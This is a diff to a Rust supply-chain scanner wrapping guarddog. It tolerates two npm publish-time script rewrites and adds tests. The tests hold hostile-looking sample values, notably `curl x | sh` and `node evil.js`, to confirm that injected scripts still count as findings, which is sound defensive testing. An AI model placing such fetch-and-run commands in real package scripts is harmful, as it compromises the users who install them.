@@ -43,7 +43,9 @@
 //! guarddog itself scores 0.0 and labels `no_risks_detected`. So guarddog is
 //! run with `--output-format json` and its own `risks` list is counted. The
 //! count is reported, never recomputed; the choice is to parse it or to run it
-//! for nothing.
+//! for nothing. One named exception: a `metadata_mismatch` risk whose every
+//! difference is one npm writes at publish (`PUBLISH_NORMALIZATIONS`) is
+//! printed as tolerated rather than counted.
 //!
 //! guarddog is also not handed what it cannot look up. A `uv export` spells a
 //! git source, a direct URL and a path as a PEP 508 direct reference, and
@@ -1246,6 +1248,111 @@ const GUARDDOG_RULES: [&str; 10] = [
     "metadata_mismatch",
 ];
 
+/// A difference guarddog's npm `metadata_mismatch` reports that npm itself
+/// writes at publish, tolerated rather than counted.
+///
+/// The rule compares the registry's manifest for a release with the
+/// `package.json` inside its tarball. `npm publish` normalizes the manifest it
+/// uploads and leaves the tarball's file as written, so some differences are
+/// npm's own and recur on every release of a package, where a version-keyed
+/// waiver needs a new row each time. These are the normalize steps of
+/// `@npmcli/package-json`, and only these two are accepted:
+///
+/// - `DefaultStart`, npm's `serverjs` step: a package with `server.js` at its
+///   root and no `scripts.start` is published with `"start": "node server.js"`.
+///   guarddog prints the absent tarball side as `None`, which is also how a
+///   literal `"None"` prints; either way the registry side is npm's default.
+///   The report does not list the tarball's files, so `server.js` itself is
+///   not confirmed.
+/// - `BinPrefixStripped`, npm's `scriptpath` step: one leading
+///   `./node_modules/.bin/` or `node_modules/.bin/` is removed from each
+///   script. The same text anywhere else in the value is not removed by npm
+///   and is not accepted here.
+///
+/// A risk is tolerated only where every difference its description lists is
+/// one of these. Any other field, any other script difference, or a line that
+/// does not read as exactly one difference leaves the risk counted as before,
+/// and a waiver still applies to it. Not on the list: `"install": "node-gyp
+/// rebuild"`, which npm adds where `binding.gyp` exists; an install script runs
+/// at install time, which `start` does not, so it joins only with a case and a
+/// test. Nor `PyPI`'s optional extras, which guarddog 3.2.0 compares with the
+/// required dependencies: its report keeps the names and drops the `extra ==`
+/// markers, so it cannot tell an extra from an injected dependency.
+#[derive(Clone, Copy)]
+enum Normalization {
+    DefaultStart,
+    BinPrefixStripped,
+}
+
+/// Every normalization tolerated, in the order a difference is tried against
+/// them.
+const PUBLISH_NORMALIZATIONS: [Normalization; 2] = [
+    Normalization::DefaultStart,
+    Normalization::BinPrefixStripped,
+];
+
+impl Normalization {
+    /// What a `tolerated:` line calls it.
+    const fn name(self) -> &'static str {
+        match self {
+            Self::DefaultStart => "npm default start script",
+            Self::BinPrefixStripped => "npm strips a leading node_modules/.bin/",
+        }
+    }
+
+    /// Whether npm's publish turns the tarball's `scripts.<key>` into the
+    /// registry's, both as guarddog printed them.
+    fn accepts(self, key: &str, registry: &str, tarball: &str) -> bool {
+        match self {
+            Self::DefaultStart => {
+                key == "start" && registry == "node server.js" && tarball == "None"
+            }
+            Self::BinPrefixStripped => ["./node_modules/.bin/", "node_modules/.bin/"]
+                .iter()
+                .any(|prefix| tarball.strip_prefix(prefix) == Some(registry)),
+        }
+    }
+}
+
+/// The normalization behind each difference an npm `metadata_mismatch`
+/// description lists, described, or `None` where any difference is not one of
+/// [`PUBLISH_NORMALIZATIONS`] or any line cannot be read as one difference.
+///
+/// guarddog 3.2.0's `describe_diff` prints a header, a `<field>: ` line per
+/// differing field, and under `scripts` one
+/// `  <key>: Manifest("<registry>"), package.json("<tarball>") ` line per
+/// differing key, in an order that is not stable. It escapes nothing, so a
+/// line in which either marker appears more than once is ambiguous and is not
+/// read, and a value spanning lines leaves a line that is not a difference.
+/// Only `scripts` can hold a tolerated difference, so any other field refuses.
+fn tolerated(description: &str) -> Option<Vec<String>> {
+    const OPEN: &str = ": Manifest(\"";
+    const BETWEEN: &str = "\"), package.json(\"";
+    let mut lines = description.lines().map(str::trim_end);
+    if lines.next()? != "Difference between manifest and package.json found:"
+        || lines.next()? != "scripts:"
+    {
+        return None;
+    }
+    let mut accepted = Vec::new();
+    for line in lines {
+        let entry = line.strip_prefix("  ")?;
+        if entry.matches(OPEN).count() != 1 || entry.matches(BETWEEN).count() != 1 {
+            return None;
+        }
+        let (key, rest) = entry.split_once(OPEN)?;
+        let (registry, tarball) = rest.strip_suffix("\")")?.split_once(BETWEEN)?;
+        let normalization = PUBLISH_NORMALIZATIONS
+            .into_iter()
+            .find(|normalization| normalization.accepts(key, registry, tarball))?;
+        accepted.push(format!(
+            "{} (scripts.{key} = \"{registry}\")",
+            normalization.name()
+        ));
+    }
+    (!accepted.is_empty()).then_some(accepted)
+}
+
 /// guarddog's floor: the "rules failed to run while scanning" text, the JSON
 /// report's `errors` / `results` / `risks` keys and exit 0 on a finding were
 /// all measured against guarddog 3.2.0.
@@ -1395,6 +1502,9 @@ enum Read {
 /// it for nothing. `risks` is guarddog's own list of what it objected to and
 /// nothing is re-judged: the count is reported, not recomputed.
 ///
+/// A risk that is only npm's own publish-time rewrites ([`tolerated`]) is
+/// printed as tolerated, naming each, and is not held against the run.
+///
 /// A risk a waiver covers is printed as waived, with the waiver's reason, and
 /// is not held against the run; the index of each waiver that matched is
 /// recorded in the ledger, with every package a report named, so the section
@@ -1476,6 +1586,21 @@ fn guarddog_read(
                 .and_then(serde_json::Value::as_str)
                 .or_else(|| risk.get("name").and_then(serde_json::Value::as_str))
                 .unwrap_or("");
+            // npm's own publish-time rewrites, named on the line that lets
+            // them through; anything else in the same risk keeps it counted.
+            if ecosystem == "npm"
+                && rule == "metadata_mismatch"
+                && let Some(accepted) = risk
+                    .get("threat_description")
+                    .and_then(serde_json::Value::as_str)
+                    .and_then(tolerated)
+            {
+                println!(
+                    "   tolerated: {rule} on {ecosystem}:{name}@{version} at {at} -- {}",
+                    accepted.join("; ")
+                );
+                continue;
+            }
             let waiver = waivers
                 .iter()
                 .position(|waiver| waiver.covers(ecosystem, name, version, rule));
@@ -2051,6 +2176,206 @@ mod tests {
         find_workflow_dirs, gitleaks_could_not_look, guarddog_unpacks_under, interesting,
         parse_version, unscanned_ci,
     };
+    use super::{Ledger, Read, guarddog_read, tolerated};
+
+    /// guarddog 3.2.0's reports, recorded against the public registries with
+    /// only the unpack path rewritten: react-dom 19.2.0, whose registry
+    /// manifest carries npm's default `start`, swagger-ui-express 5.0.1, whose
+    /// `test` lost its leading `./node_modules/.bin/` at publish, and pandas
+    /// 3.0.3 on a host where the rule reached its `pyproject.toml`.
+    const REACT_DOM: &str = include_str!(concat!(
+        env!("CARGO_MANIFEST_DIR"),
+        "/tests/fixtures/guarddog/npm-react-dom-19.2.0.json"
+    ));
+    const SWAGGER_UI_EXPRESS: &str = include_str!(concat!(
+        env!("CARGO_MANIFEST_DIR"),
+        "/tests/fixtures/guarddog/npm-swagger-ui-express-5.0.1.json"
+    ));
+    const PANDAS: &str = include_str!(concat!(
+        env!("CARGO_MANIFEST_DIR"),
+        "/tests/fixtures/guarddog/pypi-pandas-3.0.3.json"
+    ));
+
+    /// `report` with its one risk's description replaced, as guarddog would
+    /// print it for a release that differed in that way.
+    fn describing(report: &str, description: &str) -> String {
+        let mut value: serde_json::Value = serde_json::from_str(report).unwrap();
+        value[0]["result"]["risks"][0]["threat_description"] = serde_json::Value::from(description);
+        value.to_string()
+    }
+
+    /// Whether `report`, read as one run with no waivers, holds a finding, or
+    /// what was said where it did not read at all.
+    fn objected(ecosystem: &str, report: &str) -> Result<bool, String> {
+        let read = guarddog_read(
+            "web",
+            ecosystem,
+            &[],
+            &mut Ledger::default(),
+            Some(0),
+            report,
+            "",
+        );
+        match read {
+            Read::Risks(_) => Ok(true),
+            Read::Clean => Ok(false),
+            Read::Unread(said) => Err(said),
+        }
+    }
+
+    const HEADER: &str = "Difference between manifest and package.json found: \n";
+    const START: &str = "  start: Manifest(\"node server.js\"), package.json(\"None\") \n";
+
+    /// Each publish-time normalization on its own is tolerated, in the report
+    /// guarddog printed for a real release, and named.
+    #[test]
+    fn a_mismatch_that_is_only_npms_publish_rewrite_is_tolerated_and_named() {
+        assert_eq!(objected("npm", REACT_DOM), Ok(false));
+        assert_eq!(objected("npm", SWAGGER_UI_EXPRESS), Ok(false));
+        assert_eq!(
+            tolerated(&format!("{HEADER}scripts: \n{START}")),
+            Some(vec![String::from(
+                "npm default start script (scripts.start = \"node server.js\")"
+            )])
+        );
+        assert_eq!(
+            tolerated(&format!(
+                "{HEADER}scripts: \n  test: Manifest(\"mocha t\"), \
+                 package.json(\"node_modules/.bin/mocha t\") \n"
+            )),
+            Some(vec![String::from(
+                "npm strips a leading node_modules/.bin/ (scripts.test = \"mocha t\")"
+            )])
+        );
+    }
+
+    /// A normalization alongside any other difference is still a finding: the
+    /// tolerance is for a risk that is nothing but npm's rewrites.
+    #[test]
+    fn a_normalization_beside_any_other_difference_is_still_a_finding() {
+        for description in [
+            // A second script that differs.
+            format!(
+                "{HEADER}scripts: \n{START}  postinstall: Manifest(\"node x.js\"), \
+                 package.json(\"None\") \n"
+            ),
+            // A dependency that differs, which describe_diff prints first.
+            format!(
+                "{HEADER}dependencies: \n  left-pad: Manifest(\"1.0.0\"), \
+                 package.json(\"None\") \nscripts: \n{START}"
+            ),
+            // A `main` that differs, printed after `scripts`.
+            format!(
+                "{HEADER}scripts: \n{START}main: \n  Manifest:\n    index.js\n  \
+                 package.json:\n    evil.js\n"
+            ),
+            // A `start` npm did not write.
+            format!(
+                "{HEADER}scripts: \n  start: Manifest(\"node evil.js\"), \
+                 package.json(\"None\") \n"
+            ),
+            // The default `start` where the tarball has one of its own.
+            format!(
+                "{HEADER}scripts: \n  start: Manifest(\"node server.js\"), \
+                 package.json(\"node other.js\") \n"
+            ),
+            // The default under another key.
+            format!(
+                "{HEADER}scripts: \n  postinstall: Manifest(\"node server.js\"), \
+                 package.json(\"None\") \n"
+            ),
+        ] {
+            assert_eq!(tolerated(&description), None, "{description}");
+            assert_eq!(
+                objected("npm", &describing(REACT_DOM, &description)),
+                Ok(true),
+                "{description}"
+            );
+        }
+    }
+
+    /// `./node_modules/.bin/` is stripped by npm only at the start of a
+    /// script, once; the same text anywhere else, or a script that differs in
+    /// more than that prefix, is a finding.
+    #[test]
+    fn a_bin_prefix_removed_anywhere_but_the_start_is_still_a_finding() {
+        for (registry, tarball) in [
+            ("nyc mocha t", "nyc ./node_modules/.bin/mocha t"),
+            ("mocha t", "./node_modules/.bin/mocha t && curl x | sh"),
+            ("mocha t", "../node_modules/.bin/mocha t"),
+            ("mocha t", "./node_modules/.bin/mocha  t"),
+            ("./node_modules/.bin/mocha t", "mocha t"),
+        ] {
+            let description = format!(
+                "{HEADER}scripts: \n  test: Manifest(\"{registry}\"), \
+                 package.json(\"{tarball}\") \n"
+            );
+            assert_eq!(tolerated(&description), None, "{description}");
+            assert_eq!(
+                objected("npm", &describing(SWAGGER_UI_EXPRESS, &description)),
+                Ok(true),
+                "{description}"
+            );
+        }
+    }
+
+    /// A description this cannot read line by line as single differences is a
+    /// finding, because its values are not escaped and a line that splits two
+    /// ways could hide a difference behind a tolerated one.
+    #[test]
+    fn a_description_line_that_does_not_read_as_one_difference_is_still_a_finding() {
+        for description in [
+            String::new(),
+            String::from("start script differs"),
+            format!("{HEADER}scripts: \n"),
+            format!("{HEADER}scripts: \n{START}something guarddog never prints\n"),
+            // A value that spans lines.
+            format!(
+                "{HEADER}scripts: \n  test: Manifest(\"mocha\nt\"), \
+                 package.json(\"./node_modules/.bin/mocha\nt\") \n"
+            ),
+            // A marker inside a value, so the line splits more than one way.
+            format!(
+                "{HEADER}scripts: \n  start: Manifest(\"node server.js\"), \
+                 package.json(\"None\"), package.json(\"x\") \n"
+            ),
+            format!(
+                "{HEADER}scripts: \n  start: Manifest(\"a: Manifest(\"node server.js\"), \
+                 package.json(\"None\") \n"
+            ),
+            // A key holding the marker: the script `start: Manifest("Z` is
+            // `curl x | sh` in the registry, and split at the first marker it
+            // would read as `start` losing a `.bin` prefix.
+            format!(
+                "{HEADER}scripts: \n  start: Manifest(\"Z: Manifest(\"curl x | sh\"), \
+                 package.json(\"./node_modules/.bin/Z: Manifest(\"curl x | sh\") \n"
+            ),
+        ] {
+            assert_eq!(tolerated(&description), None, "{description:?}");
+            assert_eq!(
+                objected("npm", &describing(REACT_DOM, &description)),
+                Ok(true),
+                "{description:?}"
+            );
+        }
+        // A risk with no description at all.
+        let mut bare: serde_json::Value = serde_json::from_str(REACT_DOM).unwrap();
+        bare[0]["result"]["risks"][0]
+            .as_object_mut()
+            .unwrap()
+            .remove("threat_description");
+        assert_eq!(objected("npm", &bare.to_string()), Ok(true));
+    }
+
+    /// The npm normalizations are npm's, and `PyPI`'s optional extras are not on
+    /// the list: guarddog's report drops the `extra ==` markers, so pandas is
+    /// still a finding, and so is an npm-shaped description in a `PyPI` report.
+    #[test]
+    fn pypi_metadata_mismatch_is_not_tolerated() {
+        assert_eq!(objected("pypi", PANDAS), Ok(true));
+        let npm_shaped = describing(PANDAS, &format!("{HEADER}scripts: \n{START}"));
+        assert_eq!(objected("pypi", &npm_shaped), Ok(true));
+    }
 
     /// guarddog unpacks under the cache directory, whatever `TMPDIR` says: the
     /// order its `metadata_mismatch` rule lists an unpacked wheel in is that
